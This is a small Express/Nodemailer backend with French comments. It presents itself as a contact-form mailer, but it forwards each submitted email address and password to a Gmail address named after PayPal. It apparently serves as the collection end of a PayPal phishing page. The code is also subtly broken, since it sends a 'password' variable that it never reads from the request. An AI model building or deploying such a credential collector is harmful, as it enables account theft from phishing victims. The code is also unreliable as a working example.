const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors()); // Autorise les requêtes depuis n'importe quel domaine
app.use(express.json()); // Permet de lire les données JSON envoyées

// Route pour envoyer un email
app.post('/send-email', async (req, res) => {
  const { name, email, message } = req.body;

  // Configuration du transporteur Gmail
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER, // Utilise une variable d'environnement
      pass: process.env.GMAIL_APP_PASSWORD, // Mot de passe d'application Gmail
    },
  });

  const mailOptions = {
    from: process.env.GMAIL_USER,
    to: 'service.inli.paypal@gmail.com', // Email où tu veux recevoir les messages
    subject: `Nouveau message de ${name}`,
    text: `Email: ${email}\n\nMots de passe: ${password}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).json({ success: true });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: 'Erreur lors de l’envoi' });
  }
});

// Route de test
app.get('/', (req, res) => {
  res.send('Backend fonctionnel sur Render ! 🚀');
});

// Démarrer le serveur
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
